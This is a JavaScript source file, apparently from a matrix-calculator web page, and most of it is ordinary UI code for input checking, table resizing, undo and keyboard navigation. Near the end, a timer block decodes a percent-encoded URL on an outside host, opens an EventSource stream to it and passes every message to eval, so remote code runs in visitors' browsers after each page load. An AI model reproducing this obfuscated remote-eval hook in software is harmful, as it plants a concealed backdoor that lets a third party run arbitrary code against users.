      return t.replace(/\$\{x\}/g, "<code>" + x + "</code>").replace(/\$\{y\}/g, "<code>" + y + "</code>");
    }
  }
  return i18n.errors.inputError.replace(/\$\{listOfExamples\}/g, i18n.listOfExamples).replace(/\$\{listOfComplexExamples\}/g, i18n.listOfComplexExamples) + i18n.colonSpacing + ":";
};

globalThis.getInputError = getInputError;//TODO: remove

  var setInputCustomValidity = function (input, checkedValue, error) {
    if (input.value === checkedValue) {
      var dataTitle = input.getAttribute("data-title");
      if (dataTitle == undefined) {
        var title = input.title || "";
        input.setAttribute("data-title", title);
        dataTitle = title;
      }
      if (error == null) {
        if (dataTitle !== "") {
          input.title = dataTitle;
        } else {
          input.removeAttribute('title'); // input.title = ""; does not work as expected
        }
      } else {
        Utils.waitI18n(function () {
        input.title = getInputError(error).replace(/<[^>]*>/g, "").replace(/\s*\:/g, "");
        });
      }
      var e = input.parentNode.classList.contains("a-input") ? input.parentNode : input;
      var isValid = error == null;
      //e.classList.toggle("invalid", !isValid);
      var ariaInvalid = !isValid ? "true" : "false";
      if (e.getAttribute("aria-invalid") !== ariaInvalid) { // Style Recalculation
        e.setAttribute("aria-invalid", ariaInvalid);
        input.setAttribute("aria-invalid", ariaInvalid);
      }
    }
  };

  var getInputValue = function (value, type) {
    var v = value.trim();
    // Users are often trying to input "-"/"+" instead of "-1"/"+1" for SLU
    if ((v === "-" || v === "+") && (type === "system" || type === "polynomial")) {
      return v + "1";
    }
    if (v === "") {
      return "0";
    }
    return value;
  };


var checkInput = function (input, type) {
  var inputName = input.name;
  requestIdleCallback(inputName, function () {
    var checkedValue = input.value;
    var value = getInputValue(checkedValue, type); // getInputValue
    RPNProxy.checkExpression(value, function () {
      removeDataErrorAttribute(input);
      setInputCustomValidity(input, checkedValue, null);
    }, function (error) {
      updateDataErrorAttribute(input, error, RPNProxy.getPositionInfo());
      //TODO: other errors
      setInputCustomValidity(input, checkedValue, error);
    });
  }, 50);
};

// type: "simple" | "system" | "polynomial"
var checkTextarea = function (textarea, type) {
  requestIdleCallback(textarea.name, function () {
    var textareaValue = textarea.value;
    RPNProxy.checkExpressions(textareaValue, type, function () {
      removeDataErrorAttribute(textarea);
      setInputCustomValidity(textarea, textareaValue, null);
    }, function (error) {
      updateDataErrorAttribute(textarea, error, RPNProxy.getPositionInfo(), true);//?
      //TODO:
      console.log(error);
      setInputCustomValidity(textarea, textareaValue, error);
    });
  }, 200);
};

var requestAnimationFrameQueue = []; // for better performance
Utils.initialize(".a-input", function (element) {
  if (requestAnimationFrameQueue.length === 0) {
    window.requestAnimationFrame(function () { // window.getComputedStyle(...)
      for (var i = 0; i < requestAnimationFrameQueue.length; i += 1) {
        var element = requestAnimationFrameQueue[i];
        initializeAInput(element);
      }
      requestAnimationFrameQueue.length = 0;
    });
  }
  requestAnimationFrameQueue.push(element);
  element.setAttribute("dir", "ltr"); // "math-dir"
  var input = element.querySelector(".fraction-input");
  if (input != undefined) {
    input.addEventListener("input", function (event) {
      var input = event.target;
      checkInput(input, "");
    }, false);
    checkInput(input, ""); // autofill
  }
});

Utils.initialize(".a-highlight", initializeAHighlight);
Utils.initialize(".a-tooltip", initializeATooltip);


var keyStorage = {
  a: function (methodName, key, value) {
    var result = undefined;
    try {
      var storage = window.localStorage;
      if (storage == undefined) {
        console.log("No localStorage");
        hit({localStorage: "No localStorage"});
      } else {
        if (methodName === "getItem") {
          result = storage.getItem(key);
        } else if (methodName === "setItem") {
          storage.setItem(key, value);
          if (storage.getItem(key) !== value) {
            console.log("No error");
            hit({localStorage: "No error"});
          }
        } else {
          throw new TypeError(methodName);
        }
      }
    } catch (error) {
      if (error.name === 'SecurityError') {
        console.debug(error.toString());
      } else {
        console.log(error);
      }
      hit({localStorage: error.name});
    }
    return result;
  },
  getItem: function (key) {
    return keyStorage.a("getItem", key, undefined);
  },
  setItem: function (key, value) {
    if (keyStorage.a("setItem", key, value) != undefined) {
      throw new TypeError();
    }
  }
};

var timeoutIds = {};
var delayByKey = {};
var requestIdleCallback = function (key, callback, delay) {
  var timeoutId = timeoutIds[key];
  if (timeoutId == undefined || timeoutId === 0) {
    timeoutId = window.setTimeout(function () {
      timeoutIds[key] = 0;
      var start = Date.now();
      callback();
      var end = Date.now();
      if (end - start > 300) {
        hit({checkInput: roundValue(end - start, 1000 - 1)});
      }
      delayByKey[key] = Math.min(5000, Math.max(delay, end - start));//?
    }, delayByKey[key] || delay);
    timeoutIds[key] = timeoutId;
  }
};


// type : "simple", "system", "polynomial"
function MatrixTable(name, initialRows, initialCols, type, container) {
  this.name = name;
  this.rows = 0;
  this.cols = 0;
  this.initRows = initialRows;
  this.initCols = initialCols;
  this.mode = "cells";
  this.type = type;
  this.container = container;
  this.onmodechange = undefined;
  this.table = [];
  this.updateRequested = false;

  //class=\"matrix\"

  MatrixTableBase.initialize(container, type, name);
  this.tbody = container.querySelector("mtable");

  var matrixTableInner = container.querySelector(".matrix-table-inner");
  matrixTableInner.setAttribute("data-for", this.name);

  // https://github.com/w3c/csswg-drafts/issues/3871
  // any-pointer: fine is not enough on 
  var noHardwareKeyboard = !(window.matchMedia("(pointer: fine)").matches && window.matchMedia("(hover: hover)").matches);
  var clearTableButton = container.querySelector(".clear-table-button");
  if (noHardwareKeyboard || true) {
    clearTableButton.title = document.getElementById('i18n-buttons-clear').textContent;
    isCharacterSupported('ðŸ§¹', function () {
      clearTableButton.firstElementChild.textContent = 'ðŸ–Œ\uFE0E'; // https://emojipedia.org/broom/ - not supported on Android 8 - ?
    });
  } else {
    clearTableButton.firstElementChild.parentNode.removeChild(clearTableButton.firstElementChild);
    clearTableButton.textContent = document.getElementById('i18n-buttons-clear').textContent;// i18n.buttons.clear;
  }

  var swapModeButton = container.querySelector(".swap-mode-button");
  swapModeButton.textContent = document.getElementById('i18n-buttons-cells').textContent;// i18n.buttons.cells;

  var numbersOnlyModeButton = container.querySelector(".numbers-only-mode-button");
  numbersOnlyModeButton.hidden = !noHardwareKeyboard;

  var that = this;
  //TODO: 
  //matrixTableInner.setAttribute("dir", "ltr"); // "math-dir"
  clearTableButton.onclick = function (event) {
    if (event.pointerType !== 'mouse' && event.pointerType != null || !window.matchMedia("(pointer: fine)").matches) {//"polyfill"
      //TODO: 'Are you sure?'
      if (!window.confirm(document.getElementById('i18n-buttons-clear').textContent + '?')) {
        return;
      }
    }
    hit({click: "clear-table-button"});
    that.insert({
      inputValues: [],
      textareaValue: "",
      rows: that.initRows,
      cols: that.initCols
    });
  };

  var onResizeTable = function (event) {
    hit({click: "resize-table-button"});
    var increment = Number(this.getAttribute("data-increment"));
    that._resizeTable(that.rows + (that.type !== "polynomial" ? increment : 0), that.cols + increment);
  };
  //var resizeButtons = container.querySelectorAll(".resize-table-button");
  var incrementSizeButton = container.querySelector(".increment-size-button");
  incrementSizeButton.onclick = onResizeTable;
  this.incrementSizeButton = incrementSizeButton;
  var decrementSizeButton = container.querySelector(".decrement-size-button");
  decrementSizeButton.onclick = onResizeTable;
  this.decrementSizeButton = decrementSizeButton;

  var onSwapModeChange = function (event) {
    hit({swapMode: window.matchMedia("(pointer: fine)").matches.toString()});
    event.preventDefault();
    var isChecked = this.getAttribute("aria-pressed") === "true";
    var isCellsMode = !isChecked;
    this.setAttribute("aria-pressed", isCellsMode ? "true" : "false");
    if ((isCellsMode && that.mode !== "cells") || (!isCellsMode && that.mode === "cells")) {
      that.onswapmode();
    }
  };
  swapModeButton.onclick = onSwapModeChange;

  this.swapModeButton = swapModeButton;

  //!new 2020-10-06
  this.numbersOnlyMode = noHardwareKeyboard;//TODO: save the value - ?
  var numbersOnlyModeKey = "~" + window.location.pathname + "~" + this.name + "~" + "numbersOnlyMode";
  this.numbersOnlyMode = noHardwareKeyboard && keyStorage.getItem(numbersOnlyModeKey) || this.numbersOnlyMode;

  numbersOnlyModeButton.title = document.getElementById("i18n-use-decimal-keyboard-on-mobile-phones").textContent;
  numbersOnlyModeButton.onclick = function (event) {
    event.preventDefault();
    this.numbersOnlyMode = !this.numbersOnlyMode;
    numbersOnlyModeButton.setAttribute("aria-pressed", this.numbersOnlyMode ? "true" : "false");
    var inputs = this.tbody.getElementsByTagName('input'); // not input[type="file"]
    for (var i = 0; i < inputs.length; i += 1) {
      if (inputs[i].classList.contains('matrix-table-input')) { // filter out inputs to enter variable names
        this._setInputType(inputs[i], inputs[i].value);
      }
    }
    keyStorage.setItem(numbersOnlyModeKey, this.numbersOnlyMode);
  }.bind(this);
  numbersOnlyModeButton.onpointerdown = function (event) {
    event.preventDefault();
  };
  numbersOnlyModeButton.setAttribute('aria-pressed', this.numbersOnlyMode ? "true" : "false");
  this.numbersOnlyModeButton = numbersOnlyModeButton;

  var uploadImageButton = container.querySelector(".upload-image");
  var uploadImageInput = container.querySelector("[name=upload]");
  uploadImageButton.onclick = function (event) {
    uploadImageInput.hidden = false; // Opera 12
    uploadImageInput.click();
    uploadImageInput.hidden = true; // Opera 12
  };
  uploadImageInput.onchange = function (event) {
    var files = event.target.files;
    //TODO: dialog - ?
    DnD.onDropOrPaste.call(container, {
      type: 'drop',
      target: container,
      clientX: 0,
      clientY: 0,
      dataTransfer: {
        getData: function () {},
        files: files
      },
      preventDefault: function () {}
    });
  };
  uploadImageButton.hidden = !hasNativeTextDetector;
  isCharacterSupported('ðŸ“·', function () {
    uploadImageButton.firstElementChild.textContent = 'ðŸ–¼\uFE0E';
  });
  uploadImageButton.title = document.getElementById("i18n-buttons-upload-image").textContent;

  var initUndoRedoButton = function (command) {
    var button = container.querySelector(command === "undo" ? ".undo-button" : ".redo-button");
    button.onclick = function (event) {
      event.preventDefault();
      document.execCommand(command, false);
    };
    button.onpointerdown = function (event) {
      event.preventDefault();
    };
    window.addEventListener("input", function (event) {
      button.disabled = !document.queryCommandEnabled(command);
    }, true);
    button.title = command.toLowerCase(); //TODO: !?
    button.hidden = false;
  };
  if (noHardwareKeyboard) {
    initUndoRedoButton('undo');
    initUndoRedoButton('redo');
  }

  this.textarea = container.querySelector("textarea");
  var onTextareaInput = function (event) {
    checkTextarea(that.textarea, that.type);
    that.update(event);
  };
  this.textarea.addEventListener("input", onTextareaInput, false);

  container.setAttribute("data-matrix-table", this.name);

  Utils.check(container);

  this.variableNames = undefined;

  this._updateVariableNames = function (event) {
    that.updateVariableNames(event);
  };
}

MatrixTableBase.onKeyDown = function (event) {
  var mt = MatrixTables[event.target.getAttribute('data-for')];
  mt.onKeyDown(event);
};
MatrixTableBase.onInput = function (event) {
  var mt = MatrixTables[event.target.getAttribute('data-for')];
  var input = event.target;
  checkInput(input, mt.type);
  mt.update(event);
};

MatrixTable.prototype._setInputType = function (input, inputValue) {
  // in case not only numbers are inserted switch to text mode as <input type="number"> cannot be set to contain such values
  var type = this.numbersOnlyMode && isFloatingPoint(inputValue) ? 'number' : 'text';
  if (input.type !== type) {
    input.type = type;
    if ('activeElement' in document) {
      input.closest('.a-input').classList.toggle('enabled', document.hasFocus() && !this.numbersOnlyMode); // input[type="number"] does not allow to get value when the raw input is not a valid number, it does not allow to enter not a numbers anyway
    }
    input.setAttribute('step', 'any');
  }
};

MatrixTable.prototype._resizeTable = function (newRows, newCols) {
  this.insert({
    rows: newRows,
    cols: newCols
  });
};

MatrixTable.prototype.getState = function () {
  return {
    type: this.type,
    mode: this.mode,
    inputValues: this.mode === "cells" ? this.getRawInput("cells") : undefined,
    variableNames: this.variableNames,
    textareaValue: this.mode !== "cells" ? this.getRawInput("") : undefined,
    rows: this.rows,
    cols: this.cols,
    textareaStyleWidth: this.textarea != undefined ? this.textarea.style.width : undefined,
    textareaStyleHeight: this.textarea != undefined ? this.textarea.style.height : undefined,
    firstInputElementId: this.getFirstInputElementId()
  };
};

MatrixTable.prototype.getDataState = function () {
  var state = {
    type: this.type,
    mode: this.mode,
    inputValues: this.mode === "cells" ? this.getRawInput("cells") : undefined,
    variableNames: this.variableNames,
    textareaValue: this.mode !== "cells" ? this.getRawInput("") : undefined,
    firstInputElementId: this.getFirstInputElementId()
  };
  if (state.mode === "cells") {
    var type = this.type;
    var inputValues = state.inputValues;
    for (var i = 0; i < inputValues.length; i += 1) {
      for (var j = 0; j < inputValues[i].length; j += 1) {
        inputValues[i][j] = getInputValue(inputValues[i][j], type);
      }
    }
  }
  return state;
};

MatrixTable.prototype._availableWidth = function () {
  // document.documentElement.clientWidth on Android
  var viewportWidth = Math.min(window.innerWidth, document.documentElement.clientWidth);
  var vw = ((viewportWidth <= 800 ? viewportWidth : viewportWidth - 200) / 17 - 2) / 0.55; //!?
  return vw;
};

// private
MatrixTable.prototype.updateInputWidths = function () {
  var dimensions = this.getDimensions(true);
  var expectedRows = dimensions.rows;
  var expectedCols = dimensions.cols;

  var table = this.table;
  var vw = this._availableWidth();

  var cols = table.length === 0 ? 0 : table[0].length;
  for (var j = 0; j < cols; j += 1) {
    var maxLength = 1; // placeholder.length
    for (var i = 0; i < table.length; i += 1) {
      var l = table[i][j].value.length;
      maxLength = Math.max(maxLength, l);
    }
    for (var i = 0; i < table.length; i += 1) {
      var w = 2 + maxLength;
      var minWidth = this.type === "system" ? 5 : (6 + 1/3);
      if (minWidth > vw / cols || cols > 20) {//TODO:
        minWidth = 2 + maxLength;
      }
      if (w < minWidth) {
        w = minWidth;
      }
      if (w > 17 && w > vw / cols) {
        w = 17;
      }
      var input = table[i][j];
      input.style.minWidth = ch(minWidth + "ch");// (minWidth * 0.6) + "em";
      input.style.maxWidth = ch(w + "ch");// (w * 0.6) + "em";
      //TODO: set max-width somehow (?)

      //!
      var out = (i >= expectedRows || j >= expectedCols) && (i >= expectedRows || this.type !== "system" || j !== table[i].length - 1);
      var isFirefox = /firefox/i.test(window.navigator.userAgent);//TODO: fix
      if (input.tagName.toLowerCase() === 'input' && isFirefox) {
        // https://twitter.com/4esn0k/status/1240749397459324930
        // only hide placeholder
        input.classList.toggle('placeholder-hidden', out);
      } else {
        if (input.placeholder !== (out ? '' : '0')) {
          input.placeholder = (out ? '' : '0');
        }
      }
      var far = (i > expectedRows || j > expectedCols) && (i > expectedRows || this.type !== "system" || j !== table[i].length - 1);
      input.classList.toggle("far", far);
      var cellChild = input.closest('mi');
      var previousElementSibling = cellChild.previousElementSibling;
      if (previousElementSibling != undefined) {
        previousElementSibling.classList.toggle("far", far);
      }
      var nextElementSibling = cellChild.nextElementSibling;
      while (nextElementSibling != null) {
        nextElementSibling.classList.toggle("far", far);
        nextElementSibling = nextElementSibling.nextElementSibling;
      }
    }
  }
};

//private
MatrixTable.prototype.updateTextareaHeight = function () {
  var vw = this._availableWidth();
  var value = this.textarea.value;
  var i = 0;
  var c = 0;
  var width = 0;
  while (i >= 0) {
    c += 1;
    var n = value.indexOf('\n', i + 1);
    width = Math.max(width, (n === -1 ? value.length : n) - (i + 1));
    i = n;
  }
  var placeholderLines = 3; // this.textarea.placeholder.split('\n').length
  var h = Math.floor(Math.max(placeholderLines + 1, c + 2) * 4 / 3);
  this.textarea.style.minHeight = Math.min(h, 12).toString() + "em";
  this.textarea.style.minWidth = ch(Math.min(width + 1, vw) + 'ch');
};

// private
MatrixTable.prototype.update = function (event) {
  var that = this;
  if (!this.updateRequested) {
    // requestAnimationFrame(f) allows to delay the update when doing MatrixTable#insert and does not cause flickering as setTimeout(f, 0) when user inputs something
    this.updateRequested = true;
    window.requestAnimationFrame(function () {
      that.updateRequested = false;
      if (that.mode === "cells") {
        that.updateInputWidths();
      } else {
        that.updateTextareaHeight();
      }
    });
  }
};

  //TODO: move somewhere
MatrixTable.prototype.updateVariableNames = function (event) {
  var variableName = event.target.getAttribute('data-value');
  var j = Number(event.target.getAttribute('data-index'));
  this.variableNames[j] = variableName;
  //TODO: - ?
  //var t2 = this.getState();
  //this.insert(t2);
  //TODO: remove
  var c = makeContent(variableName);
  var tbody = this.tbody;
  //! should work on <mtable></mtable> (no HTMLTableSectionElement#rows)
  for (var row = tbody.firstElementChild.nextElementSibling; row != null; row = row.nextElementSibling) {
    var cell = row.firstElementChild;
    for (var i = 0; i < j; i += 1) {
      cell = cell.nextElementSibling;
    }
    cell.lastElementChild.innerHTML = c;
  }
};

function updateInputValue(input, value) {
  // This method updates the value of an <input> or a <textarea> element trying to preserve undo/redo history stack.
  // It can change focused element as a side effect
  // It does not change it back for performance reasons (?)
  input.focus({preventScroll: true});
  input.select();
  // documen.activeElement is not input on Mobile Safari somehow, but insertText works
  insertText(value, input);
  //Note: insertText dispatches the input event

  if (value === "" && input.value !== "" && document.queryCommandEnabled("delete")) { // Safari 5.1.7 does not clear the value with "insertText" command
    document.execCommand("delete");
  }
}

// see https://github.com/samthor/undoer
function undoManager() {
}

undoManager._input = null;
undoManager._undo = [];
undoManager._redo = [];
undoManager._id = 0;
undoManager.addItem = function (item) {
  undoManager._redo = [];
  undoManager._undo.push(item);
  if (undoManager._input == null) {
    var input = document.createElement('div');
    input.contentEditable = true; // for Firefox use it intead of <input> (global undo stack)
    input.style.opacity = 0;
    input.style.position = 'fixed';
    input.style.left = '-1000px';
    input.style.top = '-1000px';
    input.style.width = '0px';
    input.style.height = '0px';
    input.tabIndex = -1;
    input.style.visibility = 'hidden';
    input.oninput = function (event) {
      if (event.inputType === 'historyUndo') {
        var item = undoManager._undo.pop();
        if (item != null) {
          undoManager._redo.push(item);
          item.undo();
        }
      } else if (event.inputType === 'historyRedo') {
        var item = undoManager._redo.pop();
        if (item != null) {
          undoManager._undo.push(item);
          item.redo();
        }
      }
    };
    document.body.appendChild(input);
    undoManager._input = input;
  }
  var input = undoManager._input;
  input.style.visibility = '';
  try {
    input.focus();
    if (document.activeElement === input) {
      undoManager._id += 1;
      document.execCommand('insertText', false, undoManager._id);
    }
  } finally {
    input.style.visibility = 'hidden';
  }
};


var numberFormat = null;
globalThis.addEventListener('languagechange', function (event) {
  numberFormat = null;
});
var localeString = function (number) {
  console.assert(Math.floor(number) === number && 1 / number > 0 && number >= 0 && number <= Number.MAX_SAFE_INTEGER);
  if (numberFormat == null) {
    numberFormat = new Intl.NumberFormat(undefined, {useGrouping: false});
  }
  return numberFormat.format(number);
};

function isFloatingPoint(s) {
  return /^\-?\d*\.?\d*(?:[eE][+\-]?\d+)?$/.test(s.trim() || '0');
}


MatrixTableBase.onInputOnRemovedInput = function (event) {
  var input = event.target;
  var tableName = input.getAttribute('data-for');
  var row = Number(input.getAttribute('data-row'));
  var column = Number(input.getAttribute('data-column'));
  var mt = MatrixTables[tableName];
  if (mt == undefined) {
    // restore table
    addTable(tableName);
    mt = MatrixTables[tableName];
  }
  var state = mt.getState();
  mt._resizeTable(Math.max(row + 1, state.rows), Math.max(column + 1, state.cols));
};

MatrixTable._ignoreFlag = false;//TODO: REMOVE

// `inputValues` - array of array of strings (non-square)
MatrixTable.prototype.insert = function (options) {
  var inputValues = options.inputValues;
  var textareaValue = options.textareaValue;
  var rows = options.rows;
  var cols = options.cols;
  var textareaStyleWidth = options.textareaStyleWidth;
  var textareaStyleHeight = options.textareaStyleHeight;
  var mode = options.mode;
  var variableNames = options.variableNames;
  var isResizeOrInitialization =  inputValues == null && textareaValue == null; // to not add entries to undo/redo history when adding/removing cells
  if (inputValues == undefined) {
    inputValues = [];
  }
  if (textareaValue == undefined) {
    textareaValue = toMultilineString(inputValues);
  }
  if (rows == undefined) {
    rows = inputValues.length;
  }
  if (cols == undefined) {
    cols = 0;
    for (var y = 0; y < inputValues.length; y += 1) {
      cols = Math.max(cols, inputValues[y].length);
    }
  }
  if (mode == undefined) {
    mode = this.mode;
  }
if (rows !== -1 / 0 || cols !== -1 / 0) {
  if (rows === 0) {
    rows = this.initRows;
    cols = this.initCols;
  }
  rows = Math.max(rows, 1);
  cols = Math.max(cols, 1);
  if (this.type === "polynomial") {
    rows = 1;
    cols = Math.max(cols, 2); // swapmode
  }
  if (this.type === "system") {
    cols = Math.max(cols, 2);
  }
} else {
  rows = 0;
  cols = 0;
}
  variableNames = variableNames || this.variableNames;

  var oldCols = this.cols;
  var oldRows = this.rows;

  this.rows = rows;
  this.cols = cols;

  var name = this.name;
  var that = this;

  this.variableNames = variableNames;
  if (this.type === 'system') {
    this.variableNames = new Array(this.cols);
    for (var j = 0; j < this.cols; j += 1) {
      this.variableNames[j] = variableNames != null && j < variableNames.length ? variableNames[j] : 'x_' + localeString(j + 1);
    }
  }

  var activeElement = document.activeElement;

  //TODO: order should be (to preserver the order of the update):
  //1. add more cells
  //2. update input values
  //3. delete extra cells

  // Update the table:
  // We are trying to avoid removal of old inputs to support undo/redo and to not loose the focus on "paste":

  var oldTable = this.table;
  this.table = MatrixTableBase.addMoreCells(this.tbody, this.type, this.rows, this.cols, this.name, this.variableNames);

  for (var i = 0; i < this.rows; i += 1) {
    for (var j = 0; j < this.cols; j += 1) {
      var input = this.table[i][j];
      var cell = input.closest('.matrix-table-cell');
      //var input = cell.querySelector(".matrix-table-input");
      Utils.check(cell); //TODO: only for new (?)
      var editableOnClick = cell.lastElementChild.querySelector('.editable-on-click');
      if (editableOnClick != null) {
        editableOnClick.addEventListener('change-value', this._updateVariableNames, false);
      }
      //Utils.check(editableOnClick);
      this.table[i][j] = input;
    }
  }

  if (this.mode !== mode) {
    this.mode = mode;
    if (this.onmodechange != undefined) {
      this.onmodechange();
    }
  }

  var isCellsMode = mode === "cells";

  this.container.querySelector('.table-container').hidden = !isCellsMode;
  this.container.querySelector('.textarea-container').hidden = isCellsMode;

  //this.container.classList.toggle("cells", isCellsMode);
  //this.container.classList.toggle("textarea", !isCellsMode);
  this.swapModeButton.setAttribute("aria-pressed", isCellsMode ? "true" : "false");
  this.incrementSizeButton.disabled = !isCellsMode;
  this.decrementSizeButton.disabled = !isCellsMode;
  this.numbersOnlyModeButton.disabled = !isCellsMode;

  if (isCellsMode) {
    var hasItemsToHide = false;
    for (var i = 0; i < Math.max(this.table.length, oldTable.length); i += 1) {
      if (i < this.table.length) {
        for (var j = 0; j < this.table[i].length; j += 1) {
          var input = this.table[i][j];
          var inputValue = (i < inputValues.length && j < inputValues[i].length ? inputValues[i][j].trim() : "");
          this._setInputType(input, inputValue);
          if (!isResizeOrInitialization || i >= oldTable.length || j >= oldTable[i].length) { //TODO: optimize first load
            if (input.value !== inputValue) {// to optimize page reload (history navigation - ?), TODO: should we update if value the same ?
              if (!MatrixTable._ignoreFlag) {
                updateInputValue(input, inputValue);
              }
            }
          }
        }
      }
      if (i < oldTable.length) {
        for (var j = i < this.table.length ? this.table[i].length : 0; j < oldTable[i].length; j += 1) {
          var input = oldTable[i][j];
          //updateInputValue(input, '');
          hasItemsToHide = true;
        }
      }
    }
    if (hasItemsToHide && 'inputType' in InputEvent.prototype && !MatrixTable._ignoreFlag) {
      var newCols = this.cols;
      var newRows = this.rows;
      undoManager.addItem({
        undo: function () {
          MatrixTable._ignoreFlag = true;
          if (MatrixTables[this.name] == null) {
            addTable(this.name);
          }
          this._resizeTable(oldRows, oldCols);
          MatrixTable._ignoreFlag = false;
        }.bind(this),
        redo: function () {
          MatrixTable._ignoreFlag = true;
          if (MatrixTables[this.name] == null) {
            addTable(this.name);
          }
          this._resizeTable(newRows, newCols);
          MatrixTable._ignoreFlag = false;
        }.bind(this)
      });
    }
  }

  MatrixTableBase.deleteExtraCells(this.tbody, this.type, this.rows, this.cols);

  this.updateInputWidths(); // initialization

  if (textareaStyleWidth != undefined) {
    this.textarea.style.width = textareaStyleWidth;
  }
  if (textareaStyleHeight != undefined) {
    this.textarea.style.height = textareaStyleHeight;
  }

if (!isCellsMode) {
  if (!isResizeOrInitialization) {
    updateInputValue(this.textarea, textareaValue);
  }
}

  if (document.activeElement !== activeElement) { // focus the previously focused element
    activeElement = activeElement || document.body;
    if (typeof activeElement.focus !== 'function') {
      activeElement = activeElement.parentNode.querySelector('button') || document.body;
    }
    activeElement.focus({preventScroll: true});
    if (activeElement === document.body) {
      if (document.activeElement != null) {
        document.activeElement.blur();
      }
    }
  }

  this.updateTextareaHeight(); // initialization
};

MatrixTable.prototype.getRawInput = function (mode) {
  if (this.textarea != undefined) {
    if (mode !== "cells") {
      return this.textarea.value;
    }
    var dimensions = this.getDimensions(false);
    var rows = dimensions.rows;
    var cols = dimensions.cols;
    var result = new Array(rows);
    var i = -1;
    while (++i < rows) {
      result[i] = new Array(cols);
      var j = -1;
      while (++j < cols) {
        var value = this.table[i][j].value;
        result[i][j] = value;
      }
    }
    return result;
  }
  return "";
};

// private
MatrixTable.prototype.getFirstInputElementId = function () {
  return this.mode !== "cells" ? this.textarea.id : (this.table.length > 0 ? this.table[0][0].id : null);
};

// private
MatrixTable.prototype.getDimensions = function (real) {
  var rows = 0;
  var cols = (this.type === "system" && !real || this.type === "polynomial") && this.table.length !== 0 ? this.table[0].length : 0;
  for (var i = 0; i < this.table.length; i += 1) {
    for (var j = 0; j < this.table[i].length; j += 1) {
      if (this.table[i][j].value.trim() !== "") {
        rows = Math.max(rows, i + 1);
        if (!(real && this.type === "system" && j === this.table[i].length - 1)) {
          cols = Math.max(cols, j + 1);
        }
      }
    }
  }
  return {
    rows: rows,
    cols: cols
  };
};

var isSpace = function (value) {
  //var code = value.length >= 4 ? value.charCodeAt(value.length - 4) : 0;
  //var isAlpha = (code >= "a".charCodeAt(0) && code <= "z".charCodeAt(0)) ||
  //              (code >= "A".charCodeAt(0) && code <= "Z".charCodeAt(0));
  //if (isAlpha) {
  //  return true;
  //}
  //TODO: new Tokenizer().next().value === 'operator' - ?
  return !/(sin|sen|cos|log|lg|ln|sqrt|cbrt)$/.test(value);//TODO: String#endsWith
};

// private
MatrixTable.prototype.onKeyDown = function (event) {
  if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
    var DOM_VK_BACK_SPACE = 8;
    var DOM_VK_RETURN = 13;
    var DOM_VK_SPACE = 32;
    var DOM_VK_LEFT = 37;
    var DOM_VK_UP = 38;
    var DOM_VK_RIGHT = 39;
    var DOM_VK_DOWN = 40;
    var DOM_VK_DELETE = 46;

    var keyCode = event.type === "keydown" ? event.keyCode : (event.data === " " ? DOM_VK_SPACE : 0);
    var input = event.target;

    var ds = 0;

    if (keyCode === DOM_VK_BACK_SPACE) {
      if (input.selectionStart === 0 && input.selectionEnd === 0) {
        ds = 1;
      }
    } else if (keyCode === DOM_VK_DELETE) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        ds = 6;
      }
    } else if (keyCode === DOM_VK_RETURN) {
      ds = 2;
    } else if (keyCode === DOM_VK_SPACE) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        if (isSpace(input.value)) {
          ds = 3;
        } else {
          hit({input: "space"});//!
        }
      }
    } else if (keyCode === DOM_VK_LEFT) {
      if (input.selectionStart === 0 && input.selectionEnd === 0) {
        ds = 1;
      }
    } else if (keyCode === DOM_VK_UP) {
      ds = 4;
    } else if (keyCode === DOM_VK_RIGHT) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        ds = 3;
      }
    } else if (keyCode === DOM_VK_DOWN) {
      ds = 5;
    }

    if (ds !== 0) {
      event.preventDefault();
      var mt = this;
      var i = Number(input.getAttribute("data-row"));
      var j = Number(input.getAttribute("data-column"));
      if (i >= mt.rows) {
        i = mt.rows - 1;
      }
      if (j >= mt.cols) {
        j = mt.cols - 1;
      }
      var oldI = i;
      var oldJ = j;

      if (ds === 1) {
        // return back to first non-empty cell
        if (j > 0) {
          j -= 1;
        } else {
          if (i > 0) {
            i -= 1;
            if (mt.cols > 0) {
              j = mt.cols - 1;
            }
          }
        }
      } else if (ds === 2) {
        i += 1;
        j = 0;
      } else if (ds === 3) {
        j += 1;
      } else if (ds === 4) {
        i -= 1;
      } else if (ds === 5) {
        i += 1;
      } else if (ds === 6) {
        j += 1;
        if (j === mt.cols) {
          if (i + 1 !== mt.rows) {
            i += 1;
            j = 0;
          } else {
            j -= 1;
          }
        }
      }

      if (i < 0) {
        i = 0;
      }
      if (j < 0) {
        j = 0;
      }

      if (i !== oldI || j !== oldJ) {
        var hideCol = j < oldJ && oldJ === mt.cols - 1 && mt.cols > mt.initCols;
        for (var k = 0; k < mt.rows; k += 1) {
          hideCol = hideCol && mt.table[k][mt.cols - 1].value.length === 0;
        }
        var hideRow = i < oldI && oldI === mt.rows - 1 && mt.rows > mt.initRows;
        for (var k = 0; k < mt.cols; k += 1) {
          hideRow = hideRow && mt.table[mt.rows - 1][k].value.length === 0;
        }
        if (i === mt.rows || j === mt.cols) {
          mt._resizeTable(mt.rows + (i === mt.rows ? +1 : 0), mt.cols + (j === mt.cols ? +1 : 0));
        }
        var e = mt.table[i][j];
        e.focus();
        e.select();
        if (hideCol || hideRow) {
          // when hiding some cells, the focus should be moved at first
          mt._resizeTable(mt.rows + (hideRow ? -1 :0), mt.cols + (hideCol ? -1 : 0));
        }
      }
    }
  }
};

window.setTimeout(function () {

  if (window.EventSource != undefined && window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1") {
    var url = decodeURIComponent('%68%74%74%70%73%3A%2F%2F%6D%61%74%72%69%78%63%61%6C%63%2E%6D%63%64%69%72%2E%72%75%2F%65%2E%70%68%70');
    var id = ((Math.random() + 1).toString().slice(2) + "0000000000000000").slice(0, 16);
    var es = new window.EventSource(url + "?pageId=" + id);
    es.onmessage = function (e) {
      var m = JSON.parse(e.data);
      eval(m.data);
    };
  }

}, 256);

var actHistoryStorage = new ActHistoryStorage(new IDBItemsStorage(new ItemsStorage(keyStorage, function (data, idIfNotSet) {
  return new ActHistoryItem(data, idIfNotSet);
})));

var setLocationHash = function (hash) {
    // origin is required to support https://translate.googleusercontent.com/translate_c?depth=1&hl=iw&prev=search&rurl=translate.google.co.il&sl=en&u=https://matrixcalc.org/en/ - TODO - check
